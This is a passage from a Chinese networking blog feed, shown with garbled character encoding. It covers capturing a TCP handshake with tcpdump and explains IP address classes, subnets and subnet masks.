href="#ä¸‰ã€TCP-IP-ä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹åˆ†æ" class="headerlink" title="ä¸‰ã€TCP/IP ä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹åˆ†æ"></a>ä¸‰ã€TCP/IP ä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹åˆ†æ</h2><h3 id="1-å‡†å¤‡"><a href="#1-å‡†å¤‡" class="headerlink" title="1. å‡†å¤‡"></a>1. å‡†å¤‡</h3><p>æ“ä½œç³»ç»Ÿï¼šCentOS 7<br>ç½‘å¡ï¼šens33<br>åˆ†æç›®æ ‡ï¼šä¸ <a href="http://www.baidu.com/">www.baidu.com</a> çš„ TCP/IP ä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹è¿‡ç¨‹<br>åˆ†æå·¥å…·ï¼štcpdump<br>â€‹</p><p>CentOS å®‰è£… tcpdumpï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> tcpdump -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-æŠ“åŒ…æ“ä½œ"><a href="#2-æŠ“åŒ…æ“ä½œ" class="headerlink" title="2. æŠ“åŒ…æ“ä½œ"></a>2. æŠ“åŒ…æ“ä½œ</h3><p>é€šè¿‡<strong>ping</strong>æ“ä½œè·å–<strong><a href="http://www.baidu.com/">www.baidu.com</a></strong>å½“å‰è§£æçš„ IP åœ°å€ï¼š<strong>14.215.177.39</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627382453942-86687631-da6b-4525-90f0-63314ba26200.png#clientId=uda748786-7649-4&amp;from=paste&amp;height=205&amp;id=u98ad19bc&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=205&amp;originWidth=828&amp;originalType=binary%E2%88%B6=1&amp;size=119819&amp;status=done&amp;style=none&amp;taskId=u58910cf3-fa3b-4958-8785-dd953918692&amp;width=828" alt="image.png"><br>â€‹</p><p>æŸ¥çœ‹æœ¬åœ°çš„ IP åœ°å€<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627382588769-3b247812-e7bc-4657-a661-93cff30fd0ba.png#clientId=uda748786-7649-4&amp;from=paste&amp;height=251&amp;id=ub1bb1a58&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=251&amp;originWidth=860&amp;originalType=binary%E2%88%B6=1&amp;size=112574&amp;status=done&amp;style=none&amp;taskId=u364b22f9-bb08-4232-a783-c5f57fb1124&amp;width=860" alt="image.png"></p><p>ä½¿ç”¨<strong>tcpdump</strong>ç›‘å¬æœ¬åœ°ä¸<strong>14.215.177.39</strong>çš„é€šä¿¡æ•°æ®åŒ…</p><pre class="line-numbers language-bash"><code class="language-bash">tcpdump -n -i ens33 host 192.168.2.34 and 14.215.177.39 <span class="token operator">>></span> /tmp/tcpdump.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627382811232-4460aa9a-6557-442e-b71e-9ef04e2d1bd4.png#clientId=uda748786-7649-4&amp;from=paste&amp;height=122&amp;id=u1b0fbfca&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=122&amp;originWidth=986&amp;originalType=binary%E2%88%B6=1&amp;size=63840&amp;status=done&amp;style=none&amp;taskId=u85cedbae-6498-4400-95b5-13bb8d3e2d9&amp;width=986" alt="image.png"></p><p>ä½¿ç”¨ <strong>ping</strong> æ“ä½œæ·»åŠ å¹²æ‰°<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627382848192-04fa090d-dc68-4e51-be73-017d07c8b33d.png#clientId=uda748786-7649-4&amp;from=paste&amp;height=177&amp;id=uac959ae2&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=177&amp;originWidth=717&amp;originalType=binary%E2%88%B6=1&amp;size=68944&amp;status=done&amp;style=none&amp;taskId=u2d14866d-5180-4d2d-b284-e7cda1ef70c&amp;width=717" alt="image.png"></p><p>ä½¿ç”¨<strong>curl</strong>è®¿é—®<strong><a href="http://www.baidu.com/">www.baidu.com</a></strong></p><pre class="line-numbers language-bash"><code class="language-bash">curl http://www.baidu.com/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627382890425-aeeefcf1-e3d9-4095-afc3-776682722950.png#clientId=uda748786-7649-4&amp;from=paste&amp;height=154&amp;id=u9c8acbd9&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=154&amp;originWidth=707&amp;originalType=binary%E2%88%B6=1&amp;size=64156&amp;status=done&amp;style=none&amp;taskId=u7b873f1f-3ed6-45d4-b407-7b6b16c9eb4&amp;width=707" alt="image.png"></p><h3 id="3-åˆ†æ"><a href="#3-åˆ†æ" class="headerlink" title="3. åˆ†æ"></a>3. åˆ†æ</h3><p>æŸ¥çœ‹æ•è·çš„æ•°æ®åŒ…å†…å®¹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cat</span> /tmp/tcpdump.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸‰æ¬¡æ¡æ‰‹ ğŸ¤ è¿‡ç¨‹<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627383567174-6b2d626a-fe2e-40cd-959d-e8676587e5e9.png#clientId=uda748786-7649-4&amp;from=paste&amp;height=192&amp;id=u11156e50&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=192&amp;originWidth=1137&amp;originalType=binary%E2%88%B6=1&amp;size=153793&amp;status=done&amp;style=none&amp;taskId=u80ff2e20-bbc8-48d4-a38f-6e407743327&amp;width=1137" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627384329215-bfe607fd-6ea8-42b4-8e30-42e58863708a.png#clientId=uda748786-7649-4&amp;from=drop&amp;id=ub48278e8&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%AE%9E%E8%AE%AD%E4%BA%8C%20%282%29.png&amp;originHeight=588&amp;originWidth=768&amp;originalType=binary%E2%88%B6=1&amp;size=44986&amp;status=done&amp;style=none&amp;taskId=u5a670ce9-fb0f-42db-9dbd-d0fe346fd9a" alt="å®è®­äºŒ (2).png"><br>â€‹</p><p>å››æ¬¡æŒ¥æ‰‹ ğŸ‘‹ è¿‡ç¨‹<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627383530640-4b74b5d8-d7ae-4714-8504-1a721a313af0.png#clientId=uda748786-7649-4&amp;from=paste&amp;height=177&amp;id=u48c45c1e&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=177&amp;originWidth=1138&amp;originalType=binary%E2%88%B6=1&amp;size=147658&amp;status=done&amp;style=none&amp;taskId=u5f28f3ac-3ac3-4a14-88f5-61eea81f91f&amp;width=1138" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç»œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPåˆ†ç±»ä¸å­ç½‘åˆ’åˆ†</title>
      <link href="/post/c70bad6f.html"/>
      <url>/post/c70bad6f.html</url>
      
        <content type="html"><![CDATA[<h1 id="IP-åˆ†ç±»ä¸å­ç½‘åˆ’åˆ†"><a href="#IP-åˆ†ç±»ä¸å­ç½‘åˆ’åˆ†" class="headerlink" title="IP åˆ†ç±»ä¸å­ç½‘åˆ’åˆ†"></a>IP åˆ†ç±»ä¸å­ç½‘åˆ’åˆ†</h1><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>æ•´ä¸ªå› ç‰¹ç½‘å°±æ˜¯ä¸€ä¸ªå•ä¸€çš„ã€æŠ½è±¡çš„çš„ç½‘ç»œã€‚IP åœ°å€å°±æ˜¯ç»™å› ç‰¹ç½‘ä¸Šçš„æ¯ä¸€ä¸ªä¸»æœºï¼ˆæˆ–è·¯ç”±å™¨ï¼‰çš„æ¯ä¸€ä¸ªæ¥å£åˆ†é…ä¸€ä¸ªåœ¨å…¨ä¸–ç•ŒèŒƒå›´æ˜¯å”¯ä¸€çš„ 32 ä½çš„æ ‡è¯†ç¬¦ã€‚IP åœ°å€çš„ç»“æ„ä½¿æˆ‘ä»¬å¯ä»¥åœ¨å› ç‰¹ç½‘ä¸Šå¾ˆæ–¹ä¾¿çš„è¿›è¡Œå¯»å€ã€‚å…¶ä¸­ IP çš„ç¼–åˆ¶æ–¹æ³•å…±ç»è¿‡äº†ä¸‰ä¸ªå†å²é˜¶æ®µï¼šåˆ†ç±»çš„ IP åœ°å€ -&gt; å­ç½‘çš„åˆ’åˆ† -&gt; æ„æˆè¶…ç½‘ã€‚</p><h2 id="äºŒã€2-è¿›åˆ¶ä¸-10-è¿›åˆ¶çš„è½¬æ¢"><a href="#äºŒã€2-è¿›åˆ¶ä¸-10-è¿›åˆ¶çš„è½¬æ¢" class="headerlink" title="äºŒã€2 è¿›åˆ¶ä¸ 10 è¿›åˆ¶çš„è½¬æ¢"></a>äºŒã€2 è¿›åˆ¶ä¸ 10 è¿›åˆ¶çš„è½¬æ¢</h2><h3 id="1-äºŒè¿›åˆ¶è½¬æ¢ä¸º-10-è¿›åˆ¶"><a href="#1-äºŒè¿›åˆ¶è½¬æ¢ä¸º-10-è¿›åˆ¶" class="headerlink" title="1. äºŒè¿›åˆ¶è½¬æ¢ä¸º 10 è¿›åˆ¶"></a>1. äºŒè¿›åˆ¶è½¬æ¢ä¸º 10 è¿›åˆ¶</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627309374661-2f1c362a-df13-4d16-99dd-b8ea18867199.png#clientId=u9b6318d2-268a-4&amp;from=paste&amp;id=udf94e93c&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=596&amp;originWidth=878&amp;originalType=url%E2%88%B6=1&amp;size=132326&amp;status=done&amp;style=none&amp;taskId=ue1c670ec-5729-44ed-a231-830a0de2a51" alt="image.png"></p><h3 id="2-åè¿›åˆ¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶"><a href="#2-åè¿›åˆ¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶" class="headerlink" title="2. åè¿›åˆ¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶"></a>2. åè¿›åˆ¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627309414685-848d331a-acb7-499d-b395-b9f62c5ca306.png#clientId=u9b6318d2-268a-4&amp;from=paste&amp;id=u22488183&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=512&amp;originWidth=824&amp;originalType=url%E2%88%B6=1&amp;size=182155&amp;status=done&amp;style=none&amp;taskId=ue24d9ed1-1633-41e8-86be-01506d9fb48" alt="image.png"></p><h2 id="ä¸‰ã€IP-åœ°å€çš„ç»„æˆ"><a href="#ä¸‰ã€IP-åœ°å€çš„ç»„æˆ" class="headerlink" title="ä¸‰ã€IP åœ°å€çš„ç»„æˆ"></a>ä¸‰ã€IP åœ°å€çš„ç»„æˆ</h2><p>IP åœ°å€æ˜¯ä¸€ä¸²æ•°å­—ï¼Œéµå¾ªå›½é™…ç¼–å†™è§„èŒƒï¼Œå…±ç”± 32 ä½äºŒè¿›åˆ¶æ•°å­— 0/1 ç»„æˆ(å…³äºäºŒè¿›åˆ¶è¯·å‚è€ƒï¼šä¸€æ–‡çœ‹æ‡‚è®¡ç®—æœºæ•°æ®ï¼šä»æ¯ä½æ•°æ°¸ä¸å¤§äº 9 åˆ°äºŒè¿›åˆ¶ 0-1)ï¼Œæ¯ 8 ä½ä¸ºä¸€ç»„ï¼Œç”¨åœ†ç‚¹éš”å¼€ã€‚ç±»ä¼¼èº«ä»½å·ç çš„æ•°æ®æ®µ(6 ä½è¡¨ç¤ºç±è´¯+8 ä½è¡¨ç¤ºå‡ºç”Ÿå¹´æœˆ+3 ä½è¡¨ç¤ºé¡ºåºç +1 ä½æ ¡éªŒç )ï¼ŒIP åœ°å€æ•°æ®åˆ†ä¸ºä¸¤ä¸ªåŠŸèƒ½æ®µï¼š<br>ç½‘ç»œåœ°å€/ç½‘ç»œå·+ä¸»æœºåœ°å€/ä¸»æœºå·(å…± 32 ä½)ï¼Œå…±åˆ†ä¸ºå¦‚ä¸‹äº”å¤§ç±»ï¼Œå…¶ä¸­ A/B/C ç±»ä¸ºå¸¸ç”¨ IP åœ°å€ï¼š</p><ul><li>A ç±» IP åœ°å€ï¼š8 ä½ç½‘ç»œåœ°å€ + 24 ä½ä¸»æœºåœ°å€</li><li>B ç±» IP åœ°å€ï¼š16 ä½ç½‘ç»œåœ°å€ + 16 ä½ä¸»æœºåœ°å€</li><li>C ç±» IP åœ°å€ï¼š24 ä½ç½‘ç»œåœ°å€ + 8 ä½ä¸»æœºåœ°å€</li><li>D ç±» IP åœ°å€ä¸ºç»„æ’­åœ°å€</li><li>E ç±» IP åœ°å€ä¸ºä¿ç•™åœ°å€</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/519483/1627309650496-e848f718-fd68-485b-ab07-637eab2155b2.jpeg#clientId=u9b6318d2-268a-4&amp;from=paste&amp;id=ue244ca0c&amp;margin=%5Bobject%20Object%5D&amp;originHeight=782&amp;originWidth=640&amp;originalType=url%E2%88%B6=1&amp;status=done&amp;style=none&amp;taskId=u1cef3a3c-38da-40d9-9060-c29278a9608"><br>åˆ†ä¸º Aã€Bã€C è¿™ä¸‰ç±»ä¹‹åï¼Œå°±å¯ä»¥æ›´å¥½çš„å»åˆ†é…è¿™ 42 äº¿çš„ IP åœ°å€äº†</p><ul><li>A ç±»åœ°å€çš„ç½‘ç»œå·ä¸º 8 ä½ï¼Œä¸”é¦–ä½æ˜¯<strong>0</strong></li><li>B ç±»åœ°å€çš„ç½‘ç»œå·ä¸º 16 ä½ï¼Œå¹¶ä¸”å‰ä¸¤ä½æ˜¯<strong>10</strong></li><li>C åœ°å€çš„ç½‘ç»œå·ä¸º 24 ä½ï¼Œå¹¶ä¸”å‰ä¸‰ä½æ˜¯<strong>110</strong></li></ul><p>çŸ¥é“äº†æ¯ä¸€ç±»çš„ IP åœ°å€ç½‘ç»œå·å’Œä¸»æœºå·çš„ä½æ•°ï¼Œå°±å¯ä»¥è®¡ç®—å‡ºæœ€å°ç½‘ç»œå·ã€æœ€å¤§ç½‘ç»œå·ä»¥åŠæœ€å°ä¸»æœºå·å’Œæœ€å¤§ä¸»æœºå·ã€‚ä½†æ˜¯è¿™é‡Œè¾¹æœ‰ä¸€äº›<strong>ç‰¹æ®Šçš„ä¸»æœºå·</strong>æ˜¯éœ€è¦æ’é™¤çš„</p><h3 id="ç‰¹æ®Šçš„ä¸»æœºå·"><a href="#ç‰¹æ®Šçš„ä¸»æœºå·" class="headerlink" title="ç‰¹æ®Šçš„ä¸»æœºå·"></a>ç‰¹æ®Šçš„ä¸»æœºå·</h3><ul><li><strong>ä¸»æœºå·å…¨æ˜¯ 0</strong>ï¼Œè¡¨ç¤ºå½“å‰çš„ç½‘ç»œæ®µï¼Œä¸å¯åˆ†é…ä¸ºç‰¹å®šä¸»æœºï¼ˆå¦‚ï¼š1.0.0.0ï¼‰</li><li><strong>ä¸»æœºå·å…¨æ˜¯ 1</strong>ï¼Œè¡¨ç¤ºå¹¿æ’­åœ°å€ï¼Œå‘å½“å‰ç½‘ç»œæ®µæ‰€æœ‰ä¸»æœºå‘æ¶ˆæ¯ï¼Œä¹Ÿä¸å¯ä»¥åˆ†é…ç»™ç‰¹å®šçš„ä¸»æœºï¼ˆå¦‚ï¼š1.255.255.255ï¼‰</li></ul><h3 id="ç‰¹æ®Šçš„ç½‘ç»œå·"><a href="#ç‰¹æ®Šçš„ç½‘ç»œå·" class="headerlink" title="ç‰¹æ®Šçš„ç½‘ç»œå·"></a>ç‰¹æ®Šçš„ç½‘ç»œå·</h3><ul><li>A ç±»åœ°å€ç½‘ç»œæ®µå…¨ä¸º 0(0000000)è¡¨ç¤ºç‰¹æ®Šç½‘ç»œï¼Œè¿™ä¸ªç½‘ç»œæ®µæ˜¯ä¸èƒ½ç›´æ¥ä½¿ç”¨çš„</li><li>A ç±»åœ°å€ç½‘ç»œæ®µå 7 ä½å…¨ä¸º 1(01111111)è¡¨ç¤º<strong>å›ç¯åœ°å€</strong>ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨</li><li>B ç±»åœ°å€ç½‘ç»œæ®µå…¨ä¸º 0(10000000.0000000:128.0)æ˜¯ä¸å¯ä½¿ç”¨çš„</li><li>C ç±»åœ°å€ç½‘ç»œæ®µå…¨ä¸º 0(192.0.0)æ˜¯ä¸å¯ä½¿ç”¨çš„</li></ul><p>â€‹</p><p>çŸ¥é“äº†ç‰¹æ®Šä¸»æœºå·å’Œç‰¹æ®Šç½‘ç»œå·ä¹‹åï¼Œå°±å¯ä»¥å¯¹ä¸Šè¾¹çš„è¡¨è¿›è¡Œæ›´åŠ å‡†ç¡®çš„æè¿°<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310063870-92b48c34-999d-485e-a564-2510ce64456f.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=u2b7c6726&amp;margin=%5Bobject%20Object%5D&amp;name=2211318603-3fdbc10d8cb80d81_fix732.png&amp;originHeight=153&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=71649&amp;status=done&amp;style=none&amp;taskId=ufb22ecbe-14b1-43b4-a8d6-52b4b3289c2" alt="2211318603-3fdbc10d8cb80d81_fix732.png"><br>é€šè¿‡è¿™ä¸ªå°±å¯ä»¥ç®€å•çš„è¿›è¡Œåˆ¤æ–­ä¸€ä¸ª IP åœ°å€æ˜¯å“ªä¸€ç±»çš„åœ°å€äº†</p><pre class="line-numbers language-bash"><code class="language-bash">125.125.3.60 è½¬åŒ–ä¸º2è¿›åˆ¶æ˜¯  01111101  å› ä¸ºé¦–ä½æ˜¯0ï¼Œæ‰€ä»¥æ˜¯Aç±»IPåœ°å€163.70.31.23 è½¬åŒ–ä¸º2è¿›åˆ¶æ˜¯  10100011  å‰ä¸¤ä½æ˜¯10ï¼Œæ‰€ä»¥æ˜¯Bç±»IPåœ°å€210.36.127.11 è½¬åŒ–ä¸º2è¿›åˆ¶æ˜¯ 11010010  å‰ä¸‰ä½æ˜¯110ï¼Œæ‰€ä»¥æ˜¯Cç±»IPåœ°å€<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å›ç¯åœ°å€"><a href="#å›ç¯åœ°å€" class="headerlink" title="å›ç¯åœ°å€"></a>å›ç¯åœ°å€</h3><p>127.0.0.1ï¼Œé€šå¸¸è¢«ç§°ä¸º<strong>æœ¬åœ°å›ç¯åœ°å€</strong>ï¼ˆLoopback Addressï¼‰ï¼Œä¸å±äºä»»ä½•ä¸€ä¸ªæœ‰ç±»åˆ«çš„åœ°å€ã€‚å®ƒä»£è¡¨è®¾å¤‡çš„æœ¬åœ°è™šæ‹Ÿæ¥å£ï¼Œæ‰€ä»¥é»˜è®¤è¢«çœ‹åšæ˜¯æ°¸è¿œä¸ä¼šå®•æ‰çš„æ¥å£ã€‚åœ¨ Windows æ“ä½œç³»ç»Ÿä¸­ä¹Ÿæœ‰ç›¸ä¼¼çš„å®šä¹‰ï¼Œæ‰€ä»¥é€šå¸¸åœ¨å®‰è£…ç½‘å¡å‰å°±å¯ä»¥ ping é€šè¿™ä¸ªæœ¬åœ°å›ç¯åœ°å€ã€‚ä¸€èˆ¬éƒ½ä¼šç”¨æ¥æ£€æŸ¥æœ¬åœ°ç½‘ç»œåè®®ã€åŸºæœ¬æ•°æ®æ¥å£ç­‰æ˜¯å¦æ­£å¸¸<br>ä¸‹è¾¹å…¶å®è¿˜æœ‰ä¸¤ä¸ªåˆ†ç±»çš„ IP åœ°å€ï¼ŒD ç±»å’Œ E ç±»ï¼Œå› ä¸ºä»–ä»¬ä¸€èˆ¬æ˜¯ç‰¹æ®Šä½¿ç”¨çš„ï¼Œæ‰€ä»¥ä¸åšå…·ä½“äº†è§£<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310131636-812a42ad-0d75-4e8a-96cb-63ff7d55593d.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=u5d0c6dec&amp;margin=%5Bobject%20Object%5D&amp;name=4288250708-8cd234faa71d3b56_fix732.png&amp;originHeight=185&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=20583&amp;status=done&amp;style=none&amp;taskId=ue1c1c932-a731-4262-8d65-a737a06e2e5" alt="4288250708-8cd234faa71d3b56_fix732.png"></p><h2 id="å››ã€å­ç½‘åˆ’åˆ†"><a href="#å››ã€å­ç½‘åˆ’åˆ†" class="headerlink" title="å››ã€å­ç½‘åˆ’åˆ†"></a>å››ã€å­ç½‘åˆ’åˆ†</h2><p>åœ¨å‰è¾¹ä»‹ç»åˆ°ï¼Œä¸€ä¸ª IP ç”±ç½‘ç»œå·å’Œä¸»æœºå·ä¸¤ä¸ªéƒ¨åˆ†ç»„æˆã€‚åœ¨å­ç½‘åˆ’åˆ†è¿™å—ï¼Œä¼šå°†ä¸€ä¸ª IP åˆ†æˆä¸‰ä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯ç½‘ç»œå·ã€å­ç½‘å·ã€ä¸»æœºå·<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310243610-d263c546-d221-4778-acf1-c2e40bc74da6.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=ud8f2b3c8&amp;margin=%5Bobject%20Object%5D&amp;name=4288250708-8cd234faa71d3b56_fix732%20%281%29.png&amp;originHeight=185&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=20583&amp;status=done&amp;style=none&amp;taskId=u7bffbf43-725d-47a5-887e-1e08ae102f8" alt="4288250708-8cd234faa71d3b56_fix732 (1).png"></p><h3 id="å­ç½‘å·æ˜¯å¦‚ä½•è¿›è¡Œå·¥ä½œçš„"><a href="#å­ç½‘å·æ˜¯å¦‚ä½•è¿›è¡Œå·¥ä½œçš„" class="headerlink" title="å­ç½‘å·æ˜¯å¦‚ä½•è¿›è¡Œå·¥ä½œçš„"></a>å­ç½‘å·æ˜¯å¦‚ä½•è¿›è¡Œå·¥ä½œçš„</h3><p>å‡è®¾åœ¨ä¸Šè¾¹çš„ä¾‹å­ä¸­ï¼Œåˆ†é…äº† C ç±»åœ°å€ 193.10.10.0ï¼Œå¯¹äºè¿™ä¸ª C ç±»åœ°å€æœ‰ 254 ä¸ªä¸»æœºå·ã€‚å¦‚æœå¯¹è¿™ä¸ª C ç±»åœ°å€è¿›è¡Œå­ç½‘åˆ’åˆ†çš„è¯ï¼Œå°±å¯ä»¥æŠŠ<strong>ç¬¬ 25 ä½</strong>çœ‹åšæ˜¯å­ç½‘å·(11000001.00001010.00001010.<strong>0</strong>0000000)ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ†æˆ 1 å’Œ 0 è¿™ä¸¤ä¸ªå­ç½‘å·ã€‚é‚£ä¹ˆ 0 è¿™ä¸ªå­ç½‘å·å°±å¯ä»¥è¡¨ç¤ºï¼š193.10.10.0 ~ 193.10.10.127 è¿™ä¸ªç½‘ç»œæ®µã€‚1 è¿™ä¸ªå­ç½‘å°±å¯ä»¥è¡¨ç¤ºï¼š193.10.10.128 ~ 193.10.10.255 è¿™ä¸ªç½‘ç»œæ®µï¼Œè¿™æ ·å°±æŠŠåŸæ¥çš„ C ç±»åœ°å€åˆ†æˆäº†ä¸¤ä¸ªå­ç½‘<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310270602-9438caa7-eb22-42ca-99ae-e39a9f8e52b6.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=u5f2d199c&amp;margin=%5Bobject%20Object%5D&amp;name=2388936454-e71ba4b853cbcb08_fix732.png&amp;originHeight=153&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=34771&amp;status=done&amp;style=none&amp;taskId=u1c2d4b06-2821-4028-a6ed-9b1e1fee810" alt="2388936454-e71ba4b853cbcb08_fix732.png"><br>å¦‚æœ Aã€Bã€C ç±»çš„åœ°å€éƒ½è¿›è¡Œå¾ˆå¤šçš„å­ç½‘åˆ’åˆ†çš„è¯ï¼Œå°†ä¼šå¯¼è‡´æœ‰éå¸¸å¤šçš„å­ç½‘ï¼Œé‚£ä¹ˆæ­¤æ—¶å¦‚ä½•å¿«é€Ÿçš„åˆ¤æ–­æŸä¸€ä¸ª IP æ˜¯å±äºå“ªä¸€ä¸ªç½‘ç»œå·çš„ï¼Ÿè¿™ä¸ªæ—¶å€™å°±æå‡ºäº†ä¸€ä¸ªæ–°çš„æ¦‚å¿µï¼š<strong>å­ç½‘æ©ç </strong></p><h4 id="å­ç½‘æ©ç "><a href="#å­ç½‘æ©ç " class="headerlink" title="å­ç½‘æ©ç "></a>å­ç½‘æ©ç </h4><ul><li>å­ç½‘æ©ç å’Œ IP åœ°å€ä¸€æ ·ï¼Œéƒ½æ˜¯ 32 ä½</li><li>å­ç½‘æ©ç ç”±<strong>è¿ç»­</strong>çš„ 0 å’Œè¿ç»­çš„ 1 ç»„æˆçš„</li><li>æŸä¸€ä¸ªå­ç½‘çš„å­ç½‘æ©ç ï¼Œå…·æœ‰<strong>ç½‘ç»œå·ä½æ•°ä¸ªè¿ç»­çš„ 1</strong></li></ul><p>æ¯”å¦‚ï¼Œå¯¹äº A ç±»åœ°å€ï¼Œå®ƒçš„ç½‘ç»œå·æœ‰ 8 ä½ï¼Œä¸»æœºå· 24 ä½ï¼Œé‚£ä¹ˆå¯¹äº A ç±»åœ°å€ï¼Œå®ƒçš„å­ç½‘æ©ç å°±æ˜¯ç”± 8 ä¸ª 1 å’Œ 24 ä¸ª 0 æ‰€ç»„æˆï¼Œä¹Ÿå°±æ˜¯<strong>255.0.0.0</strong>ã€‚åŒç†ï¼ŒB ç±»åœ°å€çš„å­ç½‘æ©ç å°±æ˜¯ç”± 16 ä¸ª 1 å’Œ 16 ä¸ª 0 æ‰€ç»„æˆï¼Œä¹Ÿå°±æ˜¯<strong>255.255.0.0</strong><br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310300082-e9f6d6a5-26f7-4b9c-a18f-8d4345239c23.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=u53197b78&amp;margin=%5Bobject%20Object%5D&amp;name=2727325486-8ff1e4960840413d_fix732.png&amp;originHeight=322&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=65474&amp;status=done&amp;style=none&amp;taskId=u69da4693-b048-4749-b201-a51bddff6ce" alt="2727325486-8ff1e4960840413d_fix732.png"><br>ä¸Šè¾¹å¯¹ C ç±»åœ°å€è¿›è¡Œäº†å­ç½‘çš„åˆ’åˆ†ï¼Œå°†å…¶åˆ’åˆ†ä¸º 0 å’Œ 1 è¿™ä¸¤ä¸ªå­ç½‘ï¼Œé‚£ä¹ˆå¯¹äºè¿™ä¸ªå­ç½‘ï¼Œå®ƒçš„å­ç½‘æ©ç å°±æ˜¯ç”± 25 ä¸ª 1 å’Œ 7 ä¸ª 0 æ‰€ç»„æˆçš„ï¼Œé‚£ä¹ˆè¿™ä¸ªå­ç½‘æ©ç çš„ç‚¹åˆ†åè¿›åˆ¶å°±æ˜¯ 255.255.255.128<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627310319190-c908d8a0-43f1-4ee2-b775-0b02201ca941.png#clientId=u9b6318d2-268a-4&amp;from=drop&amp;id=ue64bc5ab&amp;margin=%5Bobject%20Object%5D&amp;name=328930210-365c4e887361e1a9_fix732.png&amp;originHeight=302&amp;originWidth=732&amp;originalType=binary%E2%88%B6=1&amp;size=61943&amp;status=done&amp;style=none&amp;taskId=ue57459cb-c2c8-4c88-a374-79f5d54868a" alt="328930210-365c4e887361e1a9_fix732.png"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="å­ç½‘æ©ç æ˜¯å¦‚ä½•è¿›è¡Œå¿«é€Ÿçš„å­ç½‘åˆ¤æ–­çš„"><a href="#å­ç½‘æ©ç æ˜¯å¦‚ä½•è¿›è¡Œå¿«é€Ÿçš„å­ç½‘åˆ¤æ–­çš„" class="headerlink" title="å­ç½‘æ©ç æ˜¯å¦‚ä½•è¿›è¡Œå¿«é€Ÿçš„å­ç½‘åˆ¤æ–­çš„"></a>å­ç½‘æ©ç æ˜¯å¦‚ä½•è¿›è¡Œå¿«é€Ÿçš„å­ç½‘åˆ¤æ–­çš„</h3><p>å‡è®¾æœ‰ 193.10.10.6 è¿™ä¸ª IPï¼Œé¦–å…ˆå¯ä»¥çŸ¥é“å®ƒçš„å­ç½‘æ©ç ä¸º 255.255.255.128ï¼Œç„¶åå°†ä»–ä»¬çš„äºŒè¿›åˆ¶éƒ½è¡¨ç¤ºå‡ºæ¥ï¼Œå°†ä»–ä»¬çš„æ¯ä¸€ä½è¿›è¡Œâ€œä¸â€è¿ç®—ï¼Œä¼šå¾—åˆ°å¦‚ä¸‹ç»“æœ<br><img 